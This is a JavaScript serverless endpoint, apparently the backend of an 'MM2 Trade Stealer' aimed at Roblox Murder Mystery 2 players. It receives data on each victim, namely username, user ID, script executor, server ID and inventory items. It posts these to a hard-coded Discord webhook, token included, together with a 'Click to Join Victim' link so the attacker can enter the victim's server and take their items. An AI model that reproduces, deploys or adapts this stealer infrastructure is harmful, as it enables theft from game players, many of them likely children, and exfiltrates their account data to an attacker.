
// api/register.js - MM2 Only
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { hitData } = req.body;

  if (!hitData) {
    return res.status(400).json({ error: 'No hit data' });
  }

  // YOUR DISCORD WEBHOOK
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";

  // Format items
  let itemsText = "";
  for (const item of hitData.items || []) {
    itemsText += `${item.name}: ${item.amount}\n`;
  }

  // Create the join link using fern.wtf (works)
  const joinLink = `https://fern.wtf/joiner?placeId=142823291&gameInstanceId=${hitData.jobId}`;

  // Send to Discord
  const embed = {
    title: "🎯 NEW MM2 HIT!",
    color: 0xFF4444,
    fields: [
      { name: "👤 Player", value: hitData.username, inline: true },
      { name: "🆔 User ID", value: hitData.robloxUserId, inline: true },
      { name: "💻 Executor", value: hitData.executor || "Unknown", inline: true },
      { name: "🎮 Server ID", value: `\`${hitData.jobId}\``, inline: false },
      { name: "📦 Items", value: `\`\`\`${itemsText || "No items"}\`\`\``, inline: false },
      { name: "🔗 Join Link", value: `[Click to Join Victim](${joinLink})`, inline: false }
    ],
    footer: { text: "MM2 Trade Stealer" },
    timestamp: new Date().toISOString()
  };

  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: "@everyone",
      embeds: [embed],
      username: "MM2 Stealer"
    })
  });

  return res.status(200).json({
    success: true,
    sessionId: "mm2_" + Date.now()
  });
      }
